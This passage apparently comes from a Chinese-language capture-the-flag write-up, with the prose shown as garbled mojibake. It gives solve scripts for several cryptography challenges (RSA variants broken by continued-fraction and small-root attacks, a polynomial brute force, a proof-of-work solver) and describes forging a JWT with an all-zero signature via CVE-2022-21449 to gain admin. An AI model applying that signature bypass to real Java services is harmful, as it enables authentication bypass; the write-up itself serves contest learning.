class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">n11=<span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">n12=<span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">e11=<span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">e12=<span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line"></span><br><span class="line">c11=<span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">c12=<span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">c2=<span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">c3=<span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(n3), idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuedFra</span>(<span class="params">x, y</span>):</span> </span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF += [x // y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Simplify</span>(<span class="params">ctnf</span>):</span> </span><br><span class="line">    numerator = <span class="number">1</span></span><br><span class="line">    denominator = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ctnf[::-<span class="number">1</span>]: </span><br><span class="line">        numerator, denominator = x * numerator + denominator, numerator </span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getit</span>(<span class="params">c</span>):</span></span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        cf.append(Simplify(c[:i])) </span><br><span class="line">    <span class="keyword">return</span> cf </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    <span class="keyword">for</span> (q1,q2) <span class="keyword">in</span> getit(cf):</span><br><span class="line">        <span class="keyword">if</span> q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> n11%q1==<span class="number">0</span> <span class="keyword">and</span> q1!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> (q1,q2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ²¡æ‰¾åˆ°èƒ½è¦†ç›–çš„åˆ†å­/åˆ†æ¯&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q11,q12=wienerAttack(n11,n12)</span><br><span class="line">p11 = <span class="built_in">int</span>(gmpy2.iroot(n11//q11, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p12 = <span class="built_in">int</span>(gmpy2.iroot(n12//q12, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">phi11 = (p11^<span class="number">2</span>-p11) * (q11-<span class="number">1</span>)</span><br><span class="line">phi12 = (p12^<span class="number">2</span>-p12) * (q12-<span class="number">1</span>)</span><br><span class="line">d11 = inverse_mod(e11, phi11)</span><br><span class="line">d12 = inverse_mod(e12, phi12)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c11, d11, n11)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c12, d12, n12)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>(m2)</span><br><span class="line">PR1.&lt;x&gt; = PolynomialRing(Zmod(n2), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = m1*m2*x - (m2 - m1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = <span class="built_in">int</span>(gcd(m1*m2*x0 - (m2 - m1), n2))</span><br><span class="line">p2 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p2),<span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q2 = <span class="built_in">int</span>(n2 // p2^<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">phi2 = (p2^<span class="number">7</span> - p2^<span class="number">6</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2, phi2)</span><br><span class="line">b = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">int</span>(b)</span><br><span class="line">PR2.&lt;y&gt; = PolynomialRing(Zmod(n3), <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">g = e3*y - b</span><br><span class="line">y0 = g.monic().small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p3 = gcd(e3*y0 - b, n3)</span><br><span class="line">p3 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p3), <span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q3 = n3 // p3^<span class="number">7</span></span><br><span class="line">phi3 = (p3^<span class="number">7</span> - p3^<span class="number">6</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = inverse_mod(e3, phi3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c3, d3, n3)))</span><br><span class="line"><span class="comment">#b&#x27;qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h1><p>cve-2022-21449ï¼Œå‚è€ƒsoreatuå¸ˆå‚…çš„åšå®¢ï¼š</p><p><a href="https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/">https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/</a></p><p>å…³é”®æ˜¯è®©sigä¼ (0, 0)ï¼ŒæŸ¥çœ‹ä»£ç åå‘ç°ç¬¬ä¸€æ®µä¸å˜ï¼Œsigä¼ 0ä½†æ˜¯è¦è€ƒè™‘ç¼–ç ï¼Œbâ€™Aâ€™å°±æ˜¯0</p><p>ncè¿ä¸Šå»ï¼Œè·å–tokenï¼Œæ‰€ä»¥ç¬¬ä¸€æ®µjwtä¸å˜ï¼Œç¬¬äºŒæ®µjwtæŠŠadminçš„å€¼æ”¹ä¸ºtrueï¼Œç¬¬ä¸‰æ®µæ”¾A</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20220803133111714.png" alt="image-20220803133111714"></p><h1 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h1><p>çœ‹ä»£ç çœ‹åŠå¤©ï¼Œncä¸€ä¸‹å°±çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹äº†ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´</p><p>å…ˆè¿‡hashæˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehash</span>(<span class="params">s, re</span>):</span></span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=s+a+b+c+d</span><br><span class="line">                    <span class="keyword">if</span>  <span class="built_in">bin</span>(<span class="built_in">int</span>(sha256(ss.encode()).hexdigest(),<span class="number">16</span>)).endswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dehash(<span class="string">&#x27;GTgC3xzo&#x27;</span>, <span class="string">&#x27;00000000000000000000&#x27;</span>))</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™r = a*b+cï¼Œå·²çŸ¥rï¼Œaï¼Œcè¦æ±‚bï¼Œåªä¸è¿‡è¿™é‡Œçš„abcréƒ½æ˜¯åœ¨æ¨¡2çš„å¤šé¡¹å¼ä¸‹çš„ï¼Œsageç›´æ¥é™¤ä¼šæ˜¾ç¤ºåˆ†å¼ï¼Œåº”è¯¥æ˜¯è¦ç»™ä¸ªæ¨¡</p><p>ncåå‘ç°rçš„æœ€é«˜æ¬¡éƒ½æ˜¯14ï¼Œaçš„æ˜¯7ï¼Œé‚£ä¹ˆbçš„æœ€é«˜ä½ä¹Ÿæ˜¯7ï¼Œçˆ†ç ´å°±èƒ½å‡ºï¼Œå¤æ‚åº¦ä¸º2^8ï¼Œå¾ˆå¿«</p><p>ä½†æ˜¯å› ä¸ºä¹‹å‰çœ‹ä»£ç ç”¨äº†å¤ªå¤šæ—¶é—´ï¼ŒåŠ ä¸Šæœ‰ç‚¹ç´§å¼ ï¼Œäºæ˜¯æ˜¯æ‰‹åŠ¨40æ¬¡å‡ºçš„ï¼ˆx</p><p>çˆ†ç ´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">R = PolynomialRing(GF(<span class="number">2</span>),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">8</span> + x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x</span><br><span class="line">a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x + <span class="number">1</span></span><br><span class="line">c = x^<span class="number">6</span> + x^<span class="number">3</span> + x</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                b = i1 + i2*x + i3*x^<span class="number">2</span> + i4*x^<span class="number">3</span> + i5*x^<span class="number">4</span> + i6*x^<span class="number">5</span> + i7*x^<span class="number">6</span> + i8*x^<span class="number">7</span></span><br><span class="line"><span class="comment">#                                 print(b)</span></span><br><span class="line">                                <span class="keyword">if</span> b*a == r-c:</span><br><span class="line">                                    <span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h1 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h1><p>ç”Ÿæˆæ²¡ä»€ä¹ˆè¯´æ³•ï¼Œå…ˆå¼€æ ¹ï¼Œç„¶åç”¨yafuä¸€é¡¿æš´åŠ›åˆ†è§£ï¼Œå¤šå¼€å‡ ä¸ªæŒ‚1ä¸ªå¤šå°æ—¶ï¼Œç„¶ååˆ†å‡ºæ¥äº†ã€‚å¯æƒœè¿˜æ˜¯æ…¢äº†ï¼Œç¬¬äº”å‡ºçš„æ²¡æ‹¿åˆ°è¡€</p><p>åˆ†è§£ä¹‹åè¦åˆ†æä¸€ä¸‹ï¼še | P2 and e | P4ï¼Œæœ¬æ¥æƒ³çš„æ˜¯åˆ†åˆ«å¼€æ ¹ç„¶åcrtã€‚ä½†æ˜¯P1å’ŒP3å·²ç»å‡‘å¤Ÿäº†512ä½ï¼Œå¦‚æœmä¹Ÿè¾¾åˆ°è¿™ä¸ªä½æ•°ï¼Œé‚£len(m)å°±æœ‰64ä½äº†ï¼Œé¢˜ç›®ç»™çš„lenæ˜¯48ï¼Œå› æ­¤å¯ç›´æ¥ç”¨P1å’ŒP3å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">P2 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">P3 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">P4 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line"></span><br><span class="line">phi = P1*(P1-<span class="number">1</span>)*P2*(P2-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)*P4*(P4-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> P1**<span class="number">2</span>*P2**<span class="number">2</span>*P3**<span class="number">2</span>*P4**<span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line">phi_ = P1*(P1-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)</span><br><span class="line">d0 = inverse_mod(e, phi_)</span><br><span class="line">m0 = <span class="built_in">pow</span>(c, d0, P1^<span class="number">2</span>*P3^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># d1 = nthroot_mod(c,e,P2^2,all_roots=True)</span></span><br><span class="line"><span class="comment"># d2 = nthroot_mod(c,e,P4^2,all_roots=True)</span></span><br><span class="line">long_to_bytes(m0)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
